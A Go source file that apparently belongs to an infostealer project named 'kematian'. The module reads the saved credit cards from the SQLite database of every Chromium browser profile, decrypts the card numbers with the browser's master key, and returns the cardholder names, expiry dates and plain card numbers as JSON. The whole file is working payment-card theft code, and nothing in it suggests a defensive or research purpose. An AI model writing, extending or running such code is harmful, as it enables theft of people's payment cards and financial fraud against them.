package cardsChromium

import (
	"database/sql"
	"encoding/json"
	"kdot/kematian/browsers/structs"
	"kdot/kematian/decryption"
)

type Cards struct {
	Name_On_Card          string `json:"name_on_card"`
	Expiration_month      string `json:"expiration_month"`
	Expiration_Year       string `json:"expiration_year"`
	Card_number_encrypted string `json:"Card_number_encrypted"`
}

func Get(browsersList []structs.Browser) string {
	var cards []Cards
	for _, browser := range browsersList {
		if !browser.IsChromium {
			continue
		}
		for _, profile := range browser.Profiles {
			path := profile.LoginData

			master_key := decryption.GetMasterKey(browser.LocalState)
			if len(master_key) == 0 {
				continue
			}
			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var name_on_card string
				var expiration_month string
				var expiration_year string
				var card_number_encrypted []byte
				row.Scan(&name_on_card, &expiration_month, &expiration_year, &card_number_encrypted)
				decrypted, err := decryption.DecryptPassword(card_number_encrypted, master_key)
				if err != nil {
					decrypted = string(card_number_encrypted)
				}
				cards = append(cards, Cards{name_on_card, expiration_month, expiration_year, decrypted})
			}
		}
	}
	jsonData, err := json.MarshalIndent(cards, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
